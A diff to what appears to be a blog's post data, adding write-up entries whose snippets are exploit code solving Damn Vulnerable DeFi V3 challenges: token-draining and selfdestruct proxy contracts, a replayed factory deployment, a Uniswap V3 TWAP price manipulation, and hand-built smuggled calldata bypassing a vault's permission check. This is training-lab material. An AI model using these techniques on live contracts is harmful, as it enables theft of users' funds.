@@ -654,7 +654,7 @@ contract Exploit_Backdoor {
         {
             id: "damn-vulnerable-defi-solutions-12-climber",
             title: `Damn Vulnerable DeFi V3 Solutions: Climber`,
-            description: `My solution to the 11th Damn Vulnerable DeFi V3 challenge.`,
+            description: `My solution to the 12th Damn Vulnerable DeFi V3 challenge.`,
             date: "June 12, 2023",
             tags: ["Security", "UUPS Proxy"],
             snippets: [
@@ -736,6 +736,184 @@ contract Exploit_Climber {
         token.address
     );
     await attacker.connect(player).exploit();
+});`,
+            ],
+        },
+        {
+            id: "damn-vulnerable-defi-solutions-13-wallet-mining",
+            title: `Damn Vulnerable DeFi V3 Solutions: Wallet Mining`,
+            description: `My solution to the 13th Damn Vulnerable DeFi V3 challenge.`,
+            date: "June 13, 2023",
+            tags: ["Security", "Replay Attack"],
+            snippets: [
+                `//SPDX-License-Identifier:MIT
+pragma solidity ^0.8.0;
+
+interface IERC20 {
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+contract BadWallet {
+    function exploit(address token, address attackerEOA) public {
+        IERC20(token).transfer(attackerEOA, 20_000_000 ether);
+    }
+}`,
+                `
+//SPDX-License-Identifier:MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
+
+contract BadAuth is UUPSUpgradeable {
+    function exploit() public {
+        address payable addr = payable(
+            address(0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B)
+        );
+        selfdestruct(addr);
+    }
+
+    function _authorizeUpgrade(address imp) internal override {}
+}`,
+                `
+it("Exploit", async function () {
+    ///////////////////////////////////////////////////////////////////////////////////////////////
+    //fund the factory deployer (this is the original GnosisSafeProxyFactory deployer from mainnet)
+    await player.sendTransaction({
+        from: player.address,
+        to: "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A",
+        value: ethers.utils.parseEther("1"),
+    });
+    //replay the transactions made by the deployer on mainnet
+    await (await ethers.provider.sendTransaction(Copy)).wait();
+    await (await ethers.provider.sendTransaction(Upgrade)).wait();
+    //deploy the factory
+    factory = await (await ethers.provider.sendTransaction(Factory)).wait();
+    DeployedFactory = (
+        await ethers.getContractFactory("GnosisSafeProxyFactory")
+    ).attach(factory.contractAddress);
+    //deploy the malicious wallet we created
+    badWallet = await (await ethers.getContractFactory("BadWallet")).deploy();
+    //encode the function to transferring the tokens from the wallet to attackerEOA
+    const payload = new ethers.utils.Interface([
+        "function exploit(address token, address attackerEOA)",
+    ]).encodeFunctionData("exploit", [token.address, player.address]);
+    //create the wallet and send the transaction at nonce 44
+    for (let i = 1; i < 45; i++) {
+        if (i == 43)
+            depositWallet = await DeployedFactory.createProxy(badWallet.address, payload);
+        await DeployedFactory.createProxy(badWallet.address, []); //increment nonce
+    }
+    //at this point we have drained 20 million tokens from the wallet
+    ///////////////////////////////////////////////////////////////////////////////////////////////
+    //Take over auth contract and upgrade it
+    const authorizerUpgradeable = await (await ethers.getContractFactory("AuthorizerUpgradeable")).attach(
+        "0xe7f1725e7734ce288f8367e1bb143e90bb3f0512"
+    );
+    await authorizerUpgradeable.connect(player).init([player.address], [token.address]);
+    //upgrade the auth contract
+    const badAuth = await (await ethers.getContractFactory("BadAuth")).deploy();
+    let data = new ethers.utils.Interface(["function exploit()"]).encodeFunctionData("exploit", []);
+    await authorizerUpgradeable.connect(player).upgradeToAndCall(badAuth.address, data);
+    //drain 43 tokens left in the contract
+    for (let i = 0; i < 43; i++) await walletDeployer.connect(player).drop([]);
+    ///////////////////////////////////////////////////////////////////////////////////////////////
+});
+`,
+            ],
+        },
+        {
+            id: "damn-vulnerable-defi-solutions-14-puppet-v3",
+            title: `Damn Vulnerable DeFi V3 Solutions: Puppet V3`,
+            description: `My solution to the 14th Damn Vulnerable DeFi V3 challenge.`,
+            date: "June 14, 2023",
+            tags: ["Security", "DeFi", "TWAP Oracle"],
+            snippets: [
+                `// SPDX-License-Identifier: MIT
+pragma solidity >=0.7.6;
+pragma abicoder v2;
+
+import "./PuppetV3Pool.sol";
+import "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
+
+contract Exploit_PuppetV3 {
+    PuppetV3Pool public lendingPool;
+    IERC20Minimal immutable weth;
+    IERC20Minimal immutable token;
+
+    ISwapRouter constant router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+
+    constructor(PuppetV3Pool _lendingPool) {
+        lendingPool = _lendingPool;
+        weth = lendingPool.weth();
+        token = lendingPool.token();
+    }
+
+    function exploit() public {
+        weth.approve(address(lendingPool), weth.balanceOf(address(this)));
+        lendingPool.borrow(token.balanceOf(address(lendingPool)));
+        token.transfer(msg.sender, token.balanceOf(address(this)));
+    }
+
+    function sellTokens() public {
+        sell(address(token), address(weth), token.balanceOf(address(this)));
+    }
+
+    function sell(address tokenIn, address tokenOut, uint amountIn) public {
+        IERC20Minimal(tokenIn).approve(address(router), amountIn);
+        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
+            .ExactInputSingleParams({
+                tokenIn: tokenIn,
+                tokenOut: tokenOut,
+                fee: 3000,
+                recipient: address(this),
+                deadline: block.timestamp,
+                amountIn: amountIn,
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            });
+        router.exactInputSingle(params);
+    }
+}`,
+                `it("Exploit", async function () {
+    attacker = await (
+        await ethers.getContractFactory("Exploit_PuppetV3", player)
+    ).deploy(lendingPool.address);
+
+    await token
+        .connect(player)
+        .transfer(attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);
+
+    await attacker.connect(player).sellTokens();
+
+    await time.increase(110);
+
+    await attacker.connect(player).exploit();
+});`,
+            ],
+        },
+        {
+            id: "damn-vulnerable-defi-solutions-15-abi-smuggling",
+            title: `Damn Vulnerable DeFi V3 Solutions: ABI Smuggling`,
+            description: `My solution to the 15th Damn Vulnerable DeFi V3 challenge.`,
+            date: "June 15, 2023",
+            tags: ["Security", "EVM", "Calldata Encoding"],
+            snippets: [
+                `it("Exploit", async function () {
+    // 0x', prefix
+    // 1cff79cd', 'execute()' function selector
+    // 000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512 - target parameter
+    // 0000000000000000000000000000000000000000000000000000000000000080 - start offset of the data
+    // 0000000000000000000000000000000000000000000000000000000000000000 - extra bytes
+    // d9caed1200000000000000000000000000000000000000000000000000000000 -
+    // 0000000000000000000000000000000000000000000000000000000000000044 -
+    // 85fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12 -
+    // fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f -
+    // 64180aa300000000000000000000000000000000000000000000000000000000 -
+
+    let calldata =
+        "0x1cff79cd000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f051200000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000d9caed1200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004485fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000000000000000000000000000000000000";
+
+    await player.sendTransaction({to: vault.address, data: calldata});
 });`,
             ],
         },
